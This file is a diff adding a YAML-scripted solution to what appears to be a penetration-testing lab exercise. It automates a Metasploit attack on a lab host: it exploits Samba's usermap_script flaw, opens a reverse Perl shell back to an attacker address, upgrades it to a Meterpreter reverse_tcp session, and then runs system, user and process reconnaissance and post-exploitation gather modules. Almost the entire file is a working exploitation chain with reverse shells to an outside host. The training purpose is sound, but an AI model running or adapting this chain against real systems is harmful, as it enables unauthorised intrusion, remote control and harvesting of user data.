@@ -1,0 +1,80 @@
+#
+# Exercise 3 Solution: Shell to Meterpreter Upgrade
+#
+
+vars:
+  TARGET: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD_INITIAL: cmd/unix/reverse_perl
+  LPORT_INITIAL: "4422"
+  LPORT_UPGRADE: "4433"
+
+commands:
+  # PHASE 1: Get a Raw Shell
+
+  - type: msf-module
+    cmd: exploit/multi/samba/usermap_script
+    payload: $PAYLOAD_INITIAL
+    options:
+      RHOSTS: $TARGET
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT_INITIAL
+    creates_session: shell
+
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  - type: debug
+    cmd: "Shell identity: $RESULT_STDOUT"
+
+  # PHASE 2: Upgrade to Meterpreter
+
+  - type: msf-module
+    cmd: post/multi/manage/shell_to_meterpreter
+    options:
+      SESSION: $LAST_MSF_SESSION
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT_UPGRADE
+    creates_session: meterpreter
+
+  - type: sleep
+    seconds: 2
+
+  # PHASE 3: Meterpreter Post-Exploitation
+
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: sysinfo
+
+  - type: debug
+    cmd: "Sysinfo: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: getuid
+
+  - type: debug
+    cmd: "Running as: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: ps
+
+  # PHASE 4: Post Modules
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_users_history
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_protections
+    options:
+      SESSION: $LAST_MSF_SESSION
